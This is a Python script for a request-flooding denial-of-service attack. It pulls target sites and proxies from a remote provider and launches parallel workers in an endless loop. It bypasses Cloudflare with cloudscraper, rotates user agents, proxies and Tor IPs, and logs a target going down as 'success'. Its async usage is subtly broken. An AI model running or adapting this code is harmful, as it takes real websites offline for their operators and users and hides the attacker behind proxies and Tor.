import asyncio
import os
from concurrent.futures import ProcessPoolExecutor
from random import choice
from sys import stderr

import cloudscraper
import requests.exceptions
from argparse import ArgumentParser
from loguru import logger
from pyuseragents import random as random_agent

from remote_provider import RemoteProvider
from settings import get_settings
from tor_proxy import TorProxy

settings = get_settings()
parser = ArgumentParser()
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.add_argument("-tor", "--tor-proxy", dest="enable_tor", default=settings.ENABLE_TOR)
parser.add_argument("-tp", "--tor-port", dest="tor_port", default=settings.TOR_PORT)
parser.add_argument("-cp", "--tor-control-port", dest="tor_control_port", default=settings.TOR_CONTROL_PORT)
parser.add_argument("-th", "--tor-host", dest="tor_host", default=settings.TOR_HOST)
parser.add_argument("-tpass", "--tor-password", dest="tor_password", default=settings.TOR_PASSWORD)

parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)

args, unknown = parser.parse_known_args()

provider = RemoteProvider(args.targets)
tor = TorProxy(
    host=args.tor_host,
    port=args.tor_port,
    control_port=args.tor_control_port,
    password=args.tor_password
)


def set_logger_format():
    logger.remove()
    logger.add(
        args.logger_output,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>"
    )
    logger.add(
        args.logger_results,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>",
        level="SUCCESS"
    )


def fetch_url(scraper, site, proxy):
    try:
        attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
        logger.info(f"{site} status {attack_response.status_code}")
        if attack_response.status_code >= 403:
            logger.success(f"{site} errored with {attack_response.status_code}")
            return
        if attack_response.status_code >= 302:
            if not settings.ENABLE_TOR:
                scraper.proxies.update({
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                })
                logger.info('USING PROXY:' + proxy)
            else:
                tor.change_ip()
                logger.info('USING TOR PROXY')
                scraper.proxies.update(tor.get_sock5_proxies())
            attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
            logger.info(f"{site} status {attack_response.status_code}")
    except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout, requests.exceptions.Timeout):
        logger.success(f"{site} is down")

    except Exception as e:
        logger.error(f"unexpected error {e}")


def attack_subprocess(site: str, proxy):
    scraper = cloudscraper.create_scraper(browser=settings.BROWSER)
    headers = settings.HEADERS_TEMPLATE
    headers['User-Agent'] = random_agent()
    scraper.headers.update(headers)
    logger.info(f"STARTING ATTACK TO  {site}")
    scraper.proxies.clear()
    tasks = asyncio.gather(*(fetch_url(scraper, site, proxy) for _ in range(settings.MAX_REQUESTS_TO_SITE)))
    loop = asyncio.get_event_loop()
    loop.run_until_complete(tasks)


if __name__ == '__main__':
    set_logger_format()
    sites = provider.get_target_sites()
    proxies = provider.get_proxies()
    while True:
        with ProcessPoolExecutor() as executor:
            processes = [executor.submit(attack_subprocess, choice(sites), choice(proxies))
                         for _ in range(os.cpu_count())]
